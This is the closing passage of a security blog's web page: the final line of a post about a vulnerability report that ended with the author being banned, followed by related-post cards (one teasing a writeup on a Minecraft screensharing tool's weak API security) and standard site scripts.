vulnerability, and passive-aggressively mocked me, before banning and blocking me. Lovely!</p><h3 id="finthanks-for-reading">Fin - Thanks for reading!</h3><p>Feel free to contact me <a href="https://ioctl.fail/contact/">here.</a></p>
    </section>


</article>
</main>




            <aside class="read-more-wrap outer">
                <div class="read-more inner">
                        
<article class="post-card post">

    <a class="post-card-image-link" href="/ocean-sstool-anticheat-site-writeup/">

        <img class="post-card-image"
            srcset="/content/images/size/w300/2024/12/vivaldi_aG05ZZLe1M.png 300w,
                    /content/images/size/w600/2024/12/vivaldi_aG05ZZLe1M.png 600w,
                    /content/images/size/w1000/2024/12/vivaldi_aG05ZZLe1M.png 1000w,
                    /content/images/size/w2000/2024/12/vivaldi_aG05ZZLe1M.png 2000w"
            sizes="(max-width: 1000px) 400px, 800px"
            src="/content/images/size/w600/2024/12/vivaldi_aG05ZZLe1M.png"
            alt="Ocean SSTool (anticheat.site) writeup."
            loading="lazy"
        />


    </a>

    <div class="post-card-content">

        <a class="post-card-content-link" href="/ocean-sstool-anticheat-site-writeup/">
            <header class="post-card-header">
                <div class="post-card-tags">
                </div>
                <h2 class="post-card-title">
                    Ocean SSTool (anticheat.site) writeup.
                </h2>
            </header>
                <div class="post-card-excerpt">Background

Ocean is another Minecraft &quot;Screensharing tool&quot;, which executes intrusive scans on your computer to try and figure out if you&#39;re cheating. Ocean&#39;s client is written in Python, and their API and program security is about as secure as a Cheeto door deadbolt.

Ocean</div>
        </a>

        <footer class="post-card-meta">
            <time class="post-card-meta-date" datetime="2023-06-30">30 Jun 2023</time>
                <span class="post-card-meta-length">7 min read</span>
        </footer>

    </div>

</article>
                        
<article class="post-card post no-image">


    <div class="post-card-content">

        <a class="post-card-content-link" href="/hi-there/">
            <header class="post-card-header">
                <div class="post-card-tags">
                </div>
                <h2 class="post-card-title">
                    Hi there.
                </h2>
            </header>
                <div class="post-card-excerpt">Hello. This is my new blog where I&#39;ll post my ramblings for the world to see.</div>
        </a>

        <footer class="post-card-meta">
            <time class="post-card-meta-date" datetime="2023-06-30">30 Jun 2023</time>
        </footer>

    </div>

</article>
                </div>
            </aside>



    </div>

    <footer class="site-footer outer">
        <div class="inner">
            <section class="copyright"><a href="https://ioctl.fail">ioctl.fail</a> &copy; 2025</section>
            <nav class="site-footer-nav">
                
            </nav>
            <div class="gh-powered-by"><a href="https://ghost.org/" target="_blank" rel="noopener">Powered by Ghost</a></div>
        </div>
    </footer>

</div>

    <div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
    <div class="pswp__bg"></div>

    <div class="pswp__scroll-wrap">
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <div class="pswp__ui pswp__ui--hidden">
            <div class="pswp__top-bar">
                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
                <button class="pswp__button pswp__button--share" title="Share"></button>
                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>
        </div>
    </div>
</div>
<script
    src="https://code.jquery.com/jquery-3.5.1.min.js"
    integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0="
    crossorigin="anonymous">
</script>
<script src="/assets/built/casper.js?v=3193de83cc"></script>
<script>
$(document).ready(function () {
    // Mobile Menu Trigger
    $('.gh-burger').click(function () {
        $('body').toggleClass('gh-head-open');
    });
    // FitVids - Makes video embeds responsive
    $(".gh-content").fitVids();
});
</script>

<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-core.min.js" integrity="sha512-9khQRAUBYEJDCDVP2yw3LRUQvjJ0Pjx0EShmaQjcHa6AXiOv6qHQu9lCAIR8O+/D8FtaCoJ2c0Tf9Xo7hYH01Q==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.min.js" integrity="sha512-SkmBfuA2hqjzEVpmnMt/LINrjop3GKWqsuLSSB3e7iBmYK7JuWw4ldmmxwD9mdm2IRTTi0OxSAfEGvgEi0i2Kw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>

<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'9006e101dc87ed0a',t:'MTczNjYxOTE4Ny4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
</html>
